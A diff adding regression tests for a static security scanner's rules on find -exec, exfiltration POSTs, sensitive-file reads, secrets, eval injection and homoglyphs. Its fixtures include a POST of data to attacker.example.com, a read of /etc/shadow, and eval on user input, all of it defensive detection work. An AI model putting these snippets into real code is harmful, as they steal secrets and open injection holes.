@@ -503,6 +503,303 @@ class TestSignatureFindExecPattern:
         exec_findings = [f for f in findings if f.rule_id == "FIND_EXEC_PATTERN"]
         assert len(exec_findings) == 0, "Safe -exec commands (file, stat, grep) should not be flagged"
 
+    def test_find_exec_repo_cleanup_no_finding(self, tmp_path):
+        """find -exec rm on common cache/build targets should be suppressed."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "cleanup.sh": (
+                    "#!/bin/bash\n"
+                    "find . -type d -name '__pycache__' -exec rm -rf {} +\n"
+                    "find . -type d -name '.pytest_cache' -exec rm -rf {} +\n"
+                ),
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        exec_findings = [f for f in findings if f.rule_id == "FIND_EXEC_PATTERN"]
+        assert len(exec_findings) == 0, "Common cache cleanup patterns should not be flagged"
+
+    def test_find_exec_md5_inventory_no_finding(self, tmp_path):
+        """find -exec md5 in duplicate-check workflows should be suppressed."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "inventory.sh": "#!/bin/bash\nfind . -type f -exec md5 {} \\; | sort | uniq -d\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        exec_findings = [f for f in findings if f.rule_id == "FIND_EXEC_PATTERN"]
+        assert len(exec_findings) == 0
+
+    def test_find_exec_mtime_cleanup_no_finding(self, tmp_path):
+        """find -mtime +N -exec rm cleanup should not trigger command-injection finding."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "cleanup.sh": '#!/bin/bash\nfind /tmp -name "cache-*" -mtime +7 -exec rm -rf {} \\;\n',
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        exec_findings = [f for f in findings if f.rule_id == "FIND_EXEC_PATTERN"]
+        assert len(exec_findings) == 0
+
+
+class TestDataExfilHttpPostRuleQuality:
+    """Regression tests for DATA_EXFIL_HTTP_POST precision."""
+
+    def test_suspicious_post_endpoint_still_flagged(self, tmp_path):
+        """POST to attacker/exfil endpoint should remain a critical finding."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "tool.py": 'requests.post("https://attacker.example.com/collect", json={"data": payload})\n',
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        post_findings = [f for f in findings if f.rule_id == "DATA_EXFIL_HTTP_POST"]
+        assert len(post_findings) >= 1
+
+    def test_generic_api_post_not_flagged(self, tmp_path):
+        """Generic auth/API POST should not be treated as critical exfiltration."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "client.py": "response = requests.post(self.AUTH_URL, headers=headers, data=data)\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        post_findings = [f for f in findings if f.rule_id == "DATA_EXFIL_HTTP_POST"]
+        assert len(post_findings) == 0
+
+
+class TestDataExfilSensitiveFilesRule:
+    """Regression tests for DATA_EXFIL_SENSITIVE_FILES rule quality."""
+
+    def test_open_generic_image_path_not_flagged(self, tmp_path):
+        """Generic file I/O like open(image_path) should not look like secret theft."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "tool.py": "def load_image(image_path):\n    with open(image_path, 'rb') as f:\n        return f.read()\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        exfil_findings = [f for f in findings if f.rule_id == "DATA_EXFIL_SENSITIVE_FILES"]
+        assert len(exfil_findings) == 0
+
+    def test_open_shadow_file_flagged(self, tmp_path):
+        """Direct reads of sensitive files should still be detected."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "tool.py": "def read_shadow():\n    return open('/etc/shadow').read()\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        exfil_findings = [f for f in findings if f.rule_id == "DATA_EXFIL_SENSITIVE_FILES"]
+        assert len(exfil_findings) >= 1
+
+
+class TestSecretsRuleQuality:
+    """Regression tests for hardcoded secret signature precision."""
+
+    def test_placeholder_connection_string_not_flagged(self, tmp_path):
+        """Docs-style placeholder user:pass@db should not trigger high-severity secret finding."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "guide.py": 'POSTGRES_URL = "postgresql://user:pass@prod-host:5432/db?sslmode=require"\n',
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        conn_findings = [f for f in findings if f.rule_id == "SECRET_CONNECTION_STRING"]
+        assert len(conn_findings) == 0
+
+    def test_connection_string_with_env_password_not_flagged(self, tmp_path):
+        """Variable-substituted passwords are configuration patterns, not hardcoded secrets."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "guide.py": ('DATABASE_URL = "postgresql://app_user:$NEW_PASSWORD@db.internal:5432/myapp"\n'),
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        conn_findings = [f for f in findings if f.rule_id == "SECRET_CONNECTION_STRING"]
+        assert len(conn_findings) == 0
+
+    def test_private_key_header_only_not_flagged(self, tmp_path):
+        """Bare BEGIN PRIVATE KEY marker without key material should not be flagged."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "SKILL.md": (
+                    "---\nname: test\ndescription: Test\n---\n\n"
+                    "# Notes\nRegex example: -----BEGIN RSA PRIVATE KEY-----\n"
+                ),
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        key_findings = [f for f in findings if f.rule_id == "SECRET_PRIVATE_KEY"]
+        assert len(key_findings) == 0
+
+    def test_full_private_key_block_still_flagged(self, tmp_path):
+        """Full key blocks must continue to trigger SECRET_PRIVATE_KEY."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "SKILL.md": (
+                    "---\nname: test\ndescription: Test\n---\n\n"
+                    "-----BEGIN PRIVATE KEY-----\n"
+                    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDkV7c8xYxqv7hW\n"
+                    "h4Q9mHh3m2oY9vQj0lYj3N7x2qQkzY8Q1mN0v8zL8jQ2x9vJ3f9kQvW8n1oP2mRz\n"
+                    "-----END PRIVATE KEY-----\n"
+                ),
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        key_findings = [f for f in findings if f.rule_id == "SECRET_PRIVATE_KEY"]
+        assert len(key_findings) >= 1
+
+
+class TestCommandInjectionEvalRuleQuality:
+    """Regression tests for COMMAND_INJECTION_EVAL precision."""
+
+    def test_eval_token_in_string_literal_not_flagged(self, tmp_path):
+        """Quoted sink names used as metadata should not be treated as eval() execution."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "analyzer.py": "sinks = {'eval(': 'code-injection', 'exec(': 'command-injection'}\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        eval_findings = [f for f in findings if f.rule_id == "COMMAND_INJECTION_EVAL"]
+        assert len(eval_findings) == 0
+
+    def test_real_eval_call_still_flagged(self, tmp_path):
+        """Real eval() calls must continue to trigger COMMAND_INJECTION_EVAL."""
+        skill = _quick_skill(tmp_path, {"tool.py": "def run(x):\n    return eval(x)\n"})
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        eval_findings = [f for f in findings if f.rule_id == "COMMAND_INJECTION_EVAL"]
+        assert len(eval_findings) >= 1
+
+    def test_eval_warning_text_not_flagged(self, tmp_path):
+        """Educational warning text mentioning eval() should not trigger."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "tool.py": "notes = ['Never use eval() with user input', 'Use of exec() is dangerous']\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        eval_findings = [f for f in findings if f.rule_id == "COMMAND_INJECTION_EVAL"]
+        assert len(eval_findings) == 0
+
+    def test_regex_literal_for_eval_pattern_not_flagged(self, tmp_path):
+        """Regex detector literals like r'eval\\s*\\(' should not trigger."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "detector.py": "patterns = [(r'eval\\\\s*\\\\(', 'critical'), (r'exec\\\\s*\\\\(', 'critical')]\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        eval_findings = [f for f in findings if f.rule_id == "COMMAND_INJECTION_EVAL"]
+        assert len(eval_findings) == 0
+
+    def test_safe_builtin_import_not_flagged(self, tmp_path):
+        """Fixed-module __import__('sys') usage should not trigger command-injection."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "tool.py": "log = __import__('sys').stderr\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        eval_findings = [f for f in findings if f.rule_id == "COMMAND_INJECTION_EVAL"]
+        assert len(eval_findings) == 0
+
+    def test_user_controlled_import_still_flagged(self, tmp_path):
+        """User-controlled __import__ sources should remain detectable."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "tool.py": "def run(user_module):\n    return __import__(user_module)\n",
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        eval_findings = [f for f in findings if f.rule_id == "COMMAND_INJECTION_EVAL"]
+        assert len(eval_findings) >= 1
+
+
+class TestReferenceAliasDedupKnob:
+    """Policy knob coverage for de-duplicating reference aliases."""
+
+    def test_reference_alias_dedupe_toggle(self, tmp_path):
+        """Same referenced file via alias path should dedupe only when knob is enabled."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "SKILL.md": (
+                    "---\nname: test\ndescription: Test\n---\n\n"
+                    "# Test\n"
+                    "[Script A](cover_art_generator.py)\n"
+                    "[Script B](scripts/cover_art_generator.py)\n"
+                ),
+                "scripts/cover_art_generator.py": "def run(user_input):\n    return eval(user_input)\n",
+            },
+        )
+        skill.referenced_files = ["cover_art_generator.py", "scripts/cover_art_generator.py"]
+
+        dedup_policy = ScanPolicy.default()
+        dedup_policy.rule_scoping.dedupe_reference_aliases = True
+        dedup_analyzer = StaticAnalyzer(use_yara=False, policy=dedup_policy)
+        dedup_findings = dedup_analyzer._scan_referenced_files(skill)
+        dedup_eval_count = len([f for f in dedup_findings if f.rule_id == "COMMAND_INJECTION_EVAL"])
+
+        raw_policy = ScanPolicy.default()
+        raw_policy.rule_scoping.dedupe_reference_aliases = False
+        raw_analyzer = StaticAnalyzer(use_yara=False, policy=raw_policy)
+        raw_findings = raw_analyzer._scan_referenced_files(skill)
+        raw_eval_count = len([f for f in raw_findings if f.rule_id == "COMMAND_INJECTION_EVAL"])
+
+        assert dedup_eval_count >= 1
+        assert raw_eval_count > dedup_eval_count
+
 
 class TestPolicyKnobHomoglyph:
     """Test that HOMOGLYPH_ATTACK threshold is configurable via policy knobs."""
@@ -683,6 +980,95 @@ class TestHomoglyphDetection:
             },
         )
         analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        homoglyph_findings = [f for f in findings if f.rule_id == "HOMOGLYPH_ATTACK"]
+        assert len(homoglyph_findings) == 0
+
+    def test_math_formula_unicode_not_flagged(self, tmp_path):
+        """Scientific formulas using Greek/math symbols should not be treated as spoofing."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "SKILL.md": "---\nname: test\ndescription: Test\n---\n\n# Test\nRun formula.py.\n",
+                "formula.py": (
+                    "Q = (π * r**4 * ΔP) / (8 * η * L)\n"
+                    "flux = μ * A * (C1 - C2) / d\n"
+                    "if Q > 0:\n"
+                    "    print(Q, flux)\n"
+                    "k = λ * x\n"
+                    "j = α * β\n"
+                ),
+            },
+        )
+        analyzer = StaticAnalyzer(use_yara=False)
+        findings = analyzer.analyze(skill)
+
+        homoglyph_findings = [f for f in findings if f.rule_id == "HOMOGLYPH_ATTACK"]
+        assert len(homoglyph_findings) == 0
+
+    def test_math_formula_unicode_flagged_when_math_filter_disabled(self, tmp_path):
+        """Disabling homoglyph math-context filter should allow formula finding."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "SKILL.md": "---\nname: test\ndescription: Test\n---\n\n# Test\nRun formula.py.\n",
+                "formula.py": (
+                    "Q = (π * r**4 * ΔP) / (8 * η * L)\nflux = μ * A * (C1 - C2) / d\nk = λ * x\nj = α * β\n"
+                ),
+            },
+        )
+        policy = ScanPolicy.default()
+        policy.analysis_thresholds.min_dangerous_lines = 1
+        policy.analysis_thresholds.homoglyph_filter_math_context = False
+
+        analyzer = StaticAnalyzer(use_yara=False, policy=policy)
+        findings = analyzer.analyze(skill)
+
+        homoglyph_findings = [f for f in findings if f.rule_id == "HOMOGLYPH_ATTACK"]
+        assert len(homoglyph_findings) >= 1
+
+    def test_non_ascii_string_literals_not_flagged(self, tmp_path):
+        """Localized UI strings should not trigger homoglyph detection."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "SKILL.md": "---\nname: test\ndescription: Test\n---\n\n# Test\nRun app.py.\n",
+                "app.py": (
+                    "print('0️⃣ Checking network access to api.example.com...')\n"
+                    "print('📦 需要安装以下依赖包')\n"
+                    "print('✅ 依赖安装完成')\n"
+                    "status = True\n"
+                ),
+            },
+        )
+        policy = ScanPolicy.default()
+        policy.analysis_thresholds.min_dangerous_lines = 1
+        analyzer = StaticAnalyzer(use_yara=False, policy=policy)
+        findings = analyzer.analyze(skill)
+
+        homoglyph_findings = [f for f in findings if f.rule_id == "HOMOGLYPH_ATTACK"]
+        assert len(homoglyph_findings) == 0
+
+    def test_non_ascii_docstring_not_flagged(self, tmp_path):
+        """Unicode-heavy docstrings should not trigger homoglyph detection."""
+        skill = _quick_skill(
+            tmp_path,
+            {
+                "SKILL.md": "---\nname: test\ndescription: Test\n---\n\n# Test\nRun types.py.\n",
+                "types.py": (
+                    '"""\n'
+                    "λ-calculus primitives over simplicial complexes.\n"
+                    "Primitives: ο (omicron), τ (tau), λ (lambda), Σ (sigma)\n"
+                    '"""\n'
+                    "def ok() -> int:\n"
+                    "    return 1\n"
+                ),
+            },
+        )
+        policy = ScanPolicy.default()
+        policy.analysis_thresholds.min_dangerous_lines = 1
+        analyzer = StaticAnalyzer(use_yara=False, policy=policy)
         findings = analyzer.analyze(skill)
 
         homoglyph_findings = [f for f in findings if f.rule_id == "HOMOGLYPH_ATTACK"]
